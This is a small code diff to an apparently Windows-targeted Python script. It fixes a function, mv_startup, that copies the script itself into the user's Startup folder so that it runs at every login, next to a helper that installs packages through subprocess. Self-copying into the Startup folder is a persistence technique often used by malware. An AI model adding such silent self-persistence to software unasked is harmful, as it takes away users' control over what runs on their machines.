@@ -1,6 +1,7 @@
 import re
 import sys
 import time
+import shutil
 import subprocess
 from pathlib import Path
 from datetime import datetime
@@ -43,7 +44,7 @@ def mv_startup():
     startup_dir = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
     target = Path(__file__).resolve()
 
-    Path.copy(target, startup_dir / target.name)
+    shutil.copy(target, startup_dir / target.name)
 
 def install(pkg):
     subprocess.run([
